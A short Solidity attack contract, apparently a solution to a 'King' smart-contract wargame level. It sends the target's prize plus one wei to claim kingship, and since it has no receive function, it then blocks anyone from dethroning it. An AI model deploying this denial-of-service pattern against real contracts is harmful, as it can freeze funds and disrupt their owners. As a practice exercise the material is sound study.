// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {

        King king = King(payable(contractAddress));
        
        uint prize = king.prize() + 1;
       
        contractAddress.call{value : prize}("");

    }


}
